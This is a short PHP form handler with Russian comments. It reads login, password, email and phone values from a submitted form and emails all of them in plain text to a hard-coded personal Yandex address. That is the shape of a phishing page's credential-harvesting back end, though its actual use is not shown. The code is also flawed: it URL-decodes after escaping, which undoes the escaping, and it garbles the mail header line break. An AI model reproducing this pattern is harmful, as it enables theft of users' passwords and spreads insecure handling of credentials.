<?php  

	//Получим данные формы
	$login = $_POST['login'];
	$pass = $_POST['pass'];
	$email = $_POST['email'];
	$tel = $_POST['tel'];

	//Обрабатываем полученные данные
	$login = htmlspecialchars($login); //Образование сиволов в сущности (мнемрники)
	$pass = htmlspecialchars($pass);
	$email = htmlspecialchars($email);
	$tel = htmlspecialchars($tel);

	$login = urldecode($login); //декодирование URl
	$pass = urldecode($pass);
	$email = urldecode($email);
	$tel = urldecode($tel);

	$login = trim($login); //удаление пробелых символов с двух сторон
	$pass = trim($pass);
	$email = trim($email);
	$tel = trim($tel);

	//отправляем данные на почту
	if(mail("kirilloff.vsevolod2017@yandex.ru",
			"Новое письмо с сайта",
			"Логин: ".$login."\n".
			"Пароль: ".$pass."\n".
			"Почта: ".$email."\n".
			"Телефон: ".$tel,
			"From: no-reply@mydomain.ru /r/n")
	) {
		echo('Письмо успешно отправлено!');
	}

	else {
		echo('Есть ошибки! Проверьте данные...');
	}

















?>


